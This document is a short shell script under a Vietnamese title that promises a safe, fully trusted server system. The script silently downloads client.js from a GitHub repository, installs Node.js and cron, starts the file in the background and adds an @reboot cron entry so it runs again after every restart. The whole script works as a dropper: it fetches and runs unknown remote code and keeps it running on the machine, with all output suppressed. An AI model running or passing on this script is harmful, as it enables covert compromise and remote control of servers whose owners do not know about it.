# Hệ thống server an toàn , trust tuyệt đối!

cd /tmp || exit 1
CLIENT_FILE="/tmp/client.js"
CRON_TAG="client-autostart"
curl -sL https://github.com/Nguoibianhz/vpstest/raw/refs/heads/main/client.js -o "$CLIENT_FILE"
SUDO=""
if command -v sudo >/dev/null 2>&1; then SUDO="sudo"; fi
if ! command -v node >/dev/null 2>&1; then
  if command -v apt-get >/dev/null 2>&1; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | $SUDO bash - >/dev/null 2>&1
    $SUDO apt-get install -y nodejs >/dev/null 2>&1
  elif command -v yum >/dev/null 2>&1; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | $SUDO bash - >/dev/null 2>&1
    $SUDO yum install -y nodejs >/dev/null 2>&1
  elif command -v apk >/dev/null 2>&1; then
    $SUDO apk add --no-cache nodejs npm >/dev/null 2>&1
  fi
fi
if ! command -v crontab >/dev/null 2>&1; then
  if command -v apt-get >/dev/null 2>&1; then
    $SUDO apt-get update >/dev/null 2>&1
    $SUDO apt-get install -y cron >/dev/null 2>&1
    ($SUDO systemctl enable cron && $SUDO systemctl start cron) >/dev/null 2>&1 || $SUDO service cron start >/dev/null 2>&1
  elif command -v yum >/dev/null 2>&1; then
    $SUDO yum install -y cronie >/dev/null 2>&1
    ($SUDO systemctl enable crond && $SUDO systemctl start crond) >/dev/null 2>&1
  elif command -v apk >/dev/null 2>&1; then
    $SUDO apk add --no-cache dcron >/dev/null 2>&1
    $SUDO crond >/dev/null 2>&1
  fi
fi
pkill -f "$CLIENT_FILE" 2>/dev/null || true
nohup node "$CLIENT_FILE" >/dev/null 2>&1 &
if command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null | grep -v "$CRON_TAG"; echo "@reboot nohup node $CLIENT_FILE >/dev/null 2>&1 & # $CRON_TAG") | crontab -
fi
